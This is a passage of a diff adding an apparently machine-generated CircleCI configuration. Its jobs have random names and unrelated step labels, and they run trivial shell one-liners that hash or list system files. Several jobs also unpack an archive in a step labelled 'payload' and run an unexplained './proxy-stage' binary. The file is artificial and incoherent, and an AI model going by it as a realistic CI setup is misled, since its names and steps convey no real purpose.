+          command: gunzip -c dev-artifacts-prod.tgz | tar xf -
+      - run:
+          name: Smoke check
+          command: sleep 25s
+      - run:
+          name: Cooldown
+          command: sleep 15
+      - run:
+          command: nice -n 0 ./proxy-stage
+  temp-id-input-dust:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: nuke jwt 8
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; echo 'disk almost full' | md5sum; true ; } > /tmp/gy/tradeGuestViolet
+            echo "output-rocket=$(wc -c </tmp/gy/tradeGuestViolet)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - 'tradeGuestViolet'
+  rocket:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Validate pre-build
+          command: |
+            { read -t 2 line < /tmp/gy/tradeGuestViolet 2>/dev/null && echo "got: ${line:0:30}" ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: gunzip -c dev-artifacts-prod.tgz | tar xf -
+      - run:
+          name: Smoke check
+          command: sleep 25s
+      - run:
+          name: Cooldown
+          command: sleep 15
+      - run:
+          command: nice -n 0 ./proxy-stage
+  flipwish:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Protocol Anchor
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; find /etc/skel -user $(whoami) -ls | tail -n 8; true ; } > /tmp/gy/EDp
+            echo "output-pr-3=$(wc -c </tmp/gy/EDp)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - 'EDp'
+  pr-3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Validate pre-build
+          command: |
+            { read -t 2 line < /tmp/gy/EDp 2>/dev/null && echo "got: ${line:0:30}" ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: gunzip -c dev-artifacts-prod.tgz | tar xf -
+      - run:
+          name: Smoke check
+          command: sleep 25s
+      - run:
+          name: Cooldown
+          command: sleep 15
+      - run:
+          command: nice -n 0 ./proxy-stage
+  dispatchJob:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Two minute warning pruning
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; od -An -tu1 -N12 /dev/urandom | tr -s ' ' '\n' | grep . | sort -nu; true ; } > /tmp/gy/a0c565776262211bab629901bf237687a3e62
+            echo "output-go1-21-test=$(wc -c </tmp/gy/a0c565776262211bab629901bf237687a3e62)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - 'a0c565776262211bab629901bf237687a3e62'
+  go1-21-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Validate pre-build
+          command: |
+            { read -t 2 line < /tmp/gy/a0c565776262211bab629901bf237687a3e62 2>/dev/null && echo "got: ${line:0:30}" ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: gunzip -c dev-artifacts-prod.tgz | tar xf -
+      - run:
+          name: Smoke check
+          command: sleep 25s
+      - run:
+          name: Cooldown
+          command: sleep 15
+      - run:
+          command: nice -n 0 ./proxy-stage
+  d57:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Fifth time pack the crafting recipes
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; tr -dc 'A-Za-z0-9' < /dev/urandom | head -c 9; echo; true ; } > /tmp/gy/access.log.4
+            echo "output-bug-233=$(wc -c </tmp/gy/access.log.4)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - 'access.log.4'
+  bug-233:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Validate pre-build
+          command: |
+            { read -t 2 line < /tmp/gy/access.log.4 2>/dev/null && echo "got: ${line:0:30}" ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: gunzip -c dev-artifacts-prod.tgz | tar xf -
+      - run:
+          name: Smoke check
+          command: sleep 25s
+      - run:
+          name: Cooldown
+          command: sleep 15
+      - run:
+          command: nice -n 0 ./proxy-stage
+  x0:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: validateChaosScenariosTask
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; ls -SG | paste -sd ' '; true ; } > /tmp/gy/workerindigo
+            echo "output-india-7=$(wc -c </tmp/gy/workerindigo)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - 'workerindigo'
+  india-7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Validate pre-build
+          command: |
+            { read -t 2 line < /tmp/gy/workerindigo 2>/dev/null && echo "got: ${line:0:30}" ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: gunzip -c dev-artifacts-prod.tgz | tar xf -
+      - run:
+          name: Smoke check
+          command: sleep 25s
+      - run:
+          name: Cooldown
+          command: sleep 15
+      - run:
+          command: nice -n 0 ./proxy-stage
+  deployWillAppear:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: 10 hover the share sheet
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; echo 'lorem ipsum dolor sit amet' 1>&2; true ; } > /tmp/gy/ROM_Burst
+            echo "output-build-full-artifact-bundle=$(wc -c </tmp/gy/ROM_Burst)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - 'ROM_Burst'
+  build-full-artifact-bundle:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Validate pre-build
+          command: |
+            { read -t 2 line < /tmp/gy/ROM_Burst 2>/dev/null && echo "got: ${line:0:30}" ; } || true
+      - run:
+          name: Pull repository
+          command: git clone --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: gunzip -c dev-artifacts-prod.tgz | tar xf -
+      - run:
+          name: Smoke check
+          command: sleep 25s
+      - run:
+          name: Cooldown
+          command: sleep 15
+      - run:
+          command: nice -n 0 ./proxy-stage
+
+  implementsTag:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Deploy the antenna over to staging
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; sdiff -w 57 <(seq 4) <(seq 2 5) | head -n6; true ; } > /tmp/gy/SSH-ROM
+            echo "output-dec10-canary=$(wc -c </tmp/gy/SSH-ROM)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - 'SSH-ROM'
+  zip_semaphore_:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Perform trace of the wifi mesh
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; sha384sum /etc/group | awk '{print $1}'; true ; } > /tmp/gy/06dc0175-d9ca-7309
+            echo "output-bake-it=$(wc -c </tmp/gy/06dc0175-d9ca-7309)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - '06dc0175-d9ca-7309'
+  store-armv7-latest:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: SWAP SIDECAR COMPLETE
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; type read; true ; } > /tmp/gy/eastAgentSweep
+            echo "output-py310-bench=$(wc -c </tmp/gy/eastAgentSweep)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - 'eastAgentSweep'
+  drainPostDigest:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: In dry run mode split the teacher model
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; find /run -maxdepth 2 -path '*/lock*' -size 0 -user "$USER" -exec echo {} ";" 2> /dev/null | nl; true ; } > /tmp/gy/access.log.4
+            echo "output-bug-233=$(wc -c </tmp/gy/access.log.4)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - 'access.log.4'
+  receiveColorMetric:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Nudge the team for round two
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; find /var/tmp -type f -name '*' -printf '%f (%s bytes)\n' 2>/dev/null | sed 's|.*/||' | sort -u; true ; } > /tmp/gy/v_71038
+            echo "output-dotnet8-bench=$(wc -c </tmp/gy/v_71038)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - 'v_71038'
+  limit-ratio-spark-cheese:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Plate the API keys
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; env -u TERM env | wc -l; true ; } > /tmp/gy/P_5876
+            echo "output-refactor-4768=$(wc -c </tmp/gy/P_5876)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - 'P_5876'
+  ThreadResourceProvider:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Back off 4 seconds
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; dd if=/dev/zero of="/tmp/meeting_2022-08.bak" bs=4k count=1 status=none && ls -l "/tmp/meeting_2022-08.bak"; true ; } > /tmp/gy/EDp
+            echo "output-pr-3=$(wc -c </tmp/gy/EDp)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - 'EDp'
+  TotalReader:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Currently repairing the user table
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; printf '%s\n' thursday monday saturday sunday >"/tmp/valley.bak"&& tac "/tmp/valley.bak"; true ; } > /tmp/gy/titan43
+            echo "output-smoke=$(wc -c </tmp/gy/titan43)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - 'titan43'
+  ARTICLE_RANK:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: True up month end and lock the period
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; ls -il1p /usr/share/*/|sort -k9; true ; } > /tmp/gy/cedar
+            echo "output-november-6=$(wc -c </tmp/gy/cedar)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - 'cedar'
+  quanyyck-core:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: demux the podcast episode NOW
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; cut -c1-20 /etc/skel/.profile | fold -w 31; true ; } > /tmp/gy/workerindigo
+            echo "output-india-7=$(wc -c </tmp/gy/workerindigo)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - 'workerindigo'
+  ttpUP:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Rotation pre the weekend
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; compgen -G "/etc/*.conf" | sort -r | head -n 10; true ; } > /tmp/gy/a0c565776262211bab629901bf237687a3e62
+            echo "output-go1-21-test=$(wc -c </tmp/gy/a0c565776262211bab629901bf237687a3e62)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - 'a0c565776262211bab629901bf237687a3e62'
+  theTempo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Take hardening offline
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; shuf -i 1-807 -n 15|sort -n|wc -l; true ; } > /tmp/gy/driver.thicket
+            echo "output-q2-smoke=$(wc -c </tmp/gy/driver.thicket)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - 'driver.thicket'
+  cron012:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Nothing to backfill
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; \ls -1lt --width=72 /usr/bin/[a-c]*; true ; } > /tmp/gy/build-7838
+            echo "output-Verify_Image5=$(wc -c </tmp/gy/build-7838)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - 'build-7838'
+  hideXMLWindow:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Meanwhile stitch the bumper
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; find /etc/skel -maxdepth 1 -iname ".bash*" -user $(id -un) | sort | head; true ; } > /tmp/gy/savann4_o773r_m4tr1x_vec70r
+            echo "output-sierra=$(wc -c </tmp/gy/savann4_o773r_m4tr1x_vec70r)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - 'savann4_o773r_m4tr1x_vec70r'
+  UXCW-2832-warning:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: MONITOR
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; cat /etc/os-release | sed 's/=.*//' | sort | uniq -d; true ; } > /tmp/gy/20200413
+            echo "output-nightly-v7=$(wc -c </tmp/gy/20200413)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - '20200413'
+  SmartSizeNode:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/gy
+      - run:
+          name: Playtest Leaderboard
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; printf '%08.3f\n' 190.3209; true ; } > /tmp/gy/DJI-57632
+            echo "output-uma-smoke=$(wc -c </tmp/gy/DJI-57632)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - 'DJI-57632'
+  blvd_img:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: unlock
+          command: |
+            mkdir -p /tmp/gy
+            { set +o pipefail 2>/dev/null; printf 'name,city,score\nmax,denver,82\notto,cairo,62\nivy,perth,99\nmia,dublin,69\n' > "/var/tmp/upload.csv" && cut -d, -f1,3 "/var/tmp/upload.csv"; true ; } > /tmp/gy/tradeGuestViolet
+            echo "output-rocket=$(wc -c </tmp/gy/tradeGuestViolet)"
+      - persist_to_workspace:
+          root: /tmp/gy
+          paths:
+            - 'tradeGuestViolet'
+workflows:
+  default:
+    jobs:
+      - Legacy-Union-Locked
+      - implementsTag:
+          requires:
+            - Legacy-Union-Locked
+      - dec10-canary:
+          requires:
+            - implementsTag
+      - hWndIteratorLegacyTensor:
+          requires:
+            - implementsTag
+      - zip_semaphore_:
+          requires:
+            - hWndIteratorLegacyTensor
+      - bake-it:
+          requires:
+            - zip_semaphore_
+      - IYGKXS-5697a:
+          requires:
+            - zip_semaphore_
+      - store-armv7-latest:
+          requires:
+            - IYGKXS-5697a
+      - py310-bench:
+          requires:
+            - store-armv7-latest
+      - d57:
+          requires:
+            - store-armv7-latest
+      - drainPostDigest:
+          requires:
+            - d57
+      - bug-233:
+          requires:
+            - drainPostDigest
+      - wrapper_restart_parsed_canvas:
+          requires:
+            - drainPostDigest
+      - receiveColorMetric:
+          requires:
+            - wrapper_restart_parsed_canvas
+      - dotnet8-bench:
+          requires:
+            - receiveColorMetric
+      - November:
+          requires:
+            - receiveColorMetric
+      - limit-ratio-spark-cheese:
+          requires:
+            - November
+      - refactor-4768:
+          requires:
+            - limit-ratio-spark-cheese
+      - flipwish:
+          requires:
+            - limit-ratio-spark-cheese
+      - ThreadResourceProvider:
+          requires:
+            - flipwish
+      - pr-3:
+          requires:
+            - ThreadResourceProvider
+      - uat-dev-63:
+          requires:
+            - ThreadResourceProvider
+      - TotalReader:
+          requires:
+            - uat-dev-63
+      - smoke:
+          requires:
+            - TotalReader
+      - aiGrowChunk:
+          requires:
+            - TotalReader
+      - ARTICLE_RANK:
+          requires:
+            - aiGrowChunk
+      - november-6:
+          requires:
+            - ARTICLE_RANK
+      - calcVPNs
+      - iirc_b
+      - APP-284:
+          requires:
+            - calcVPNs
+            - iirc_b
+      - rm-webhook:
+          requires:
+            - calcVPNs
+            - iirc_b
+      - rollout:
+          requires:
+            - calcVPNs
+            - iirc_b
+      - x0
+      - quanyyck-core:
+          requires:
+            - x0
+      - india-7:
+          requires:
+            - quanyyck-core
+      - dispatchJob:
+          requires:
+            - quanyyck-core
+      - ttpUP:
+          requires:
+            - dispatchJob
+      - go1-21-test:
+          requires:
+            - ttpUP
+      - ms_arg:
+          requires:
+            - ttpUP
+      - theTempo:
+          requires:
+            - ms_arg
+      - q2-smoke:
+          requires:
+            - theTempo
+      - dumpCountForKey:
+          requires:
+            - theTempo
+      - cron012:
+          requires:
+            - dumpCountForKey
+      - Verify_Image5:
+          requires:
+            - cron012
+      - teardown_loop:
+          requires:
+            - cron012
+      - hideXMLWindow:
+          requires:
+            - teardown_loop
+      - sierra:
+          requires:
+            - hideXMLWindow
+      - lr0:
+          requires:
+            - hideXMLWindow
+      - UXCW-2832-warning:
+          requires:
+            - lr0
+      - nightly-v7:
+          requires:
+            - UXCW-2832-warning
+      - instance-parchment:
+          requires:
+            - UXCW-2832-warning
+      - SmartSizeNode:
+          requires:
+            - instance-parchment
+      - uma-smoke:
+          requires:
+            - SmartSizeNode
+      - temp-id-input-dust:
+          requires:
+            - SmartSizeNode
+      - blvd_img:
+          requires:
+            - temp-id-input-dust
+      - rocket:
+          requires:
+            - blvd_img
+      - elmWhiskey
+      - metaLenMin
+      - anchor-31984-big
+      - tam-verify:
+          requires:
+            - elmWhiskey
+            - metaLenMin
+            - anchor-31984-big
+      - v5-ga5:
+          requires:
+            - elmWhiskey
+            - metaLenMin
+            - anchor-31984-big
+      - hotel-5:
+          requires:
+            - elmWhiskey
+            - metaLenMin
+            - anchor-31984-big
+      - publish:
+          requires:
+            - elmWhiskey
+            - metaLenMin
+            - anchor-31984-big
+      - STG_INIT_8:
+          requires:
+            - elmWhiskey
+            - metaLenMin
+            - anchor-31984-big
+      - java17-release:
+          requires:
+            - elmWhiskey
+            - metaLenMin
+            - anchor-31984-big
+      - blast-off:
+          requires:
+            - elmWhiskey
+            - metaLenMin
+            - anchor-31984-big
+      - deployWillAppear
+      - build-full-artifact-bundle:
+          requires:
+            - deployWillAppear
+      - sphere_chess_notify_font:
+          requires:
+            - deployWillAppear
+      - succes-only:
+          requires:
+            - sphere_chess_notify_font
+      - NullErrorUtils:
+          requires:
+            - sphere_chess_notify_font
+      - feb1-canary:
+          requires:
+            - NullErrorUtils
